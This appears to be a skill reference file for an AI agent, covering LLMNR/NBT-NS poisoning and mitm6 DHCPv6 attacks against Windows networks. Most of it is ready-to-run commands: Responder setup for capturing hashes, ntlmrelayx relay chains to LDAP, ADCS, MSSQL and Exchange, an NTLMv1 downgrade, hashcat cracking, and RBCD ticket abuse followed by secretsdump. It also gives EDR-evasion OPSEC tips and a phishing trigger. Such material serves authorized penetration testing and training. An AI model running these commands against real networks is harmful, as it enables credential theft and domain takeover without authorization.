---
name: name-resolution-poisoning
description: >-
  Deep-dive into LLMNR/NBT-NS/mDNS poisoning with Responder and mitm6. Covers credential capture workflows, relay target selection, hash format analysis, and attack chaining.
---

# NAME RESOLUTION POISONING — Responder & mitm6 Deep Dive

> Supplementary reference for [network-protocol-attacks](./SKILL.md) §2–§4. Load when you need detailed Responder configuration, relay chaining, or credential format analysis.

---

## 1. RESPONDER CONFIGURATION

### Core Config — `/opt/Responder/Responder.conf`

```ini
[Responder Core]
; Turn specific servers on/off
SQL      = On
SMB      = On
RDP      = On
Kerberos = On
FTP      = On
POP      = On
SMTP     = On
IMAP     = On
HTTP     = On
HTTPS    = On
DNS      = On
LDAP     = On
DCERPC   = On
WinRM    = On

; Authentication type
; For relay: use Off for SMB and HTTP to avoid capturing (let ntlmrelayx handle it)
; For capture: keep On

[HTTP Server]
; Challenge to use for HTTP NTLM
Challenge = Random
```

### Responder for Capture Mode

```bash
# Full capture — all protocols
responder -I eth0 -dwPv

# Output: /opt/Responder/logs/
# Files: HTTP-NTLMv2-CLIENT_IP.txt, SMB-NTLMv2-CLIENT_IP.txt, etc.
# Format: USER::DOMAIN:challenge:response:blob
```

### Responder for Relay Mode

```bash
# Disable SMB and HTTP servers in Responder.conf (let ntlmrelayx handle auth)
# Responder.conf: SMB = Off, HTTP = Off

responder -I eth0 -dwPv

# In parallel terminal:
ntlmrelayx.py -tf targets.txt -smb2support
```

---

## 2. RELAY TARGET SELECTION

### Identify Targets Without SMB Signing

```bash
# CrackMapExec — find hosts with SMB signing disabled
crackmapexec smb SUBNET/24 --gen-relay-list targets.txt
# Output: targets.txt with IPs where signing is not required

# Nmap
nmap -p 445 --script smb2-security-mode SUBNET/24
# Look for: "Message signing enabled but not required"
```

### Relay Targets by Protocol

| Relay Target | Requirement | Command | Impact |
|---|---|---|---|
| SMB | Signing not required | `ntlmrelayx.py -tf targets.txt` | Code execution if admin |
| LDAP(S) | Signing not enforced on DC | `ntlmrelayx.py -t ldaps://DC` | Modify AD objects, RBCD |
| MSSQL | No EPA | `ntlmrelayx.py -t mssql://DB -q "QUERY"` | SQL execution |
| HTTP(S) | NTLM auth accepted | `ntlmrelayx.py -t http://TARGET/endpoint` | Web action as victim |
| IMAP | NTLM auth | `ntlmrelayx.py -t imap://EXCHANGE` | Email access |
| SMTP | NTLM auth | `ntlmrelayx.py -t smtp://EXCHANGE` | Send email as victim |

### High-Value Relay Chains

```bash
# Chain 1: Responder → ntlmrelayx → LDAP → RBCD → silver ticket
ntlmrelayx.py -t ldaps://DC01 --delegate-access
# Creates machine account, sets RBCD → use getST.py for service ticket

# Chain 2: Responder → ntlmrelayx → LDAP → shadow credentials
ntlmrelayx.py -t ldaps://DC01 --shadow-credentials --shadow-target TARGET$

# Chain 3: Responder → ntlmrelayx → ADCS → certificate
ntlmrelayx.py -t http://CA01/certsrv/certfnsh.asp --adcs --template DomainController

# Chain 4: mitm6 → ntlmrelayx → LDAP → delegate
mitm6 -d domain.com &
ntlmrelayx.py -6 -t ldaps://DC01 -wh fakewpad.domain.com --delegate-access
```

---

## 3. CREDENTIAL FORMAT ANALYSIS

### NetNTLMv1 Hash

```
user::DOMAIN:LM_RESPONSE:NTLM_RESPONSE:SERVER_CHALLENGE
```

- Hashcat mode: `5500`
- Can be downgraded if Responder uses a fixed challenge (`1122334455667788`)
- With fixed challenge → crack via `crack.sh` / rainbow tables instantly

```bash
# Force NTLMv1 downgrade (Responder.conf):
Challenge = 1122334455667788

# Then submit to crack.sh or use rainbow tables
# NTLMv1 with ESS: extract the real NT hash via DES cracking
```

### NetNTLMv2 Hash

```
user::DOMAIN:SERVER_CHALLENGE:NTProofStr:BLOB
```

- Hashcat mode: `5600`
- Cannot use rainbow tables (includes random client challenge)
- Requires dictionary + rules attack

```bash
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 5600 ntlmv2_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule
```

### Cracking Priority

```
1. NTLMv1 (mode 5500) → crack first, fastest
2. NTLMv1-ESS with fixed challenge → crack.sh for free
3. NTLMv2 (mode 5600) → dictionary + rules
4. If cracking fails → relay instead of crack
```

---

## 4. mitm6 DETAILED WORKFLOW

### Prerequisites

```bash
pip install mitm6
# Requires: scapy, twisted, ldap3
```

### Attack Flow

```
Step 1: mitm6 sends DHCPv6 replies → victim gets IPv6 + attacker as DNS
Step 2: Victim DNS queries (IPv6) go to attacker
Step 3: Attacker returns WPAD config → forces NTLM auth
Step 4: ntlmrelayx captures NTLM and relays to target
```

```bash
# Terminal 1: mitm6
mitm6 -d domain.com -i eth0

# Terminal 2: ntlmrelayx with LDAP relay
ntlmrelayx.py -6 -t ldaps://DC01.domain.com -wh fakewpad.domain.com -l lootdir

# -6       : listen on IPv6
# -wh      : WPAD host to inject
# -l       : loot directory for dumped data
# --delegate-access : create machine account + set RBCD
```

### Post-Exploitation After Successful Relay

```bash
# If --delegate-access succeeded:
# 1. Get service ticket via RBCD
getST.py -spn cifs/TARGET.domain.com -impersonate administrator \
    domain.com/'MACHINE$':'PASSWORD' -dc-ip DC_IP

# 2. Use ticket
export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass TARGET.domain.com
```

---

## 5. TROUBLESHOOTING

| Issue | Cause | Fix |
|---|---|---|
| No hashes captured | LLMNR/NBT-NS disabled via GPO | Try mitm6 (DHCPv6 is harder to disable) |
| Only machine accounts | Machines query more than users | Wait, trigger user queries (e.g., phish link to `\\attacker\share`) |
| Relay fails "signing required" | Target enforces SMB signing | Relay to LDAP/HTTP/MSSQL instead |
| mitm6 no response | IPv6 disabled on target | Fall back to LLMNR/WPAD |
| NTLMv2 won't crack | Strong password | Use relay, don't waste time cracking |
| Responder conflicts | Another LLMNR responder on network | Check for legitimate WPAD/LLMNR, use `-A` mode first |

---

## 6. OPSEC CONSIDERATIONS

- Run Responder in analyze mode (`-A`) first to assess traffic
- Limit poisoning to specific targets to reduce noise
- Use `--lm` flag in Responder only if NTLMv1 downgrade is needed
- mitm6 affects all hosts on segment — use `-hw` to filter targets
- Clean up DHCPv6 leases after attack (they persist ~300 seconds)
- Monitor for AV/EDR alerting on tool signatures
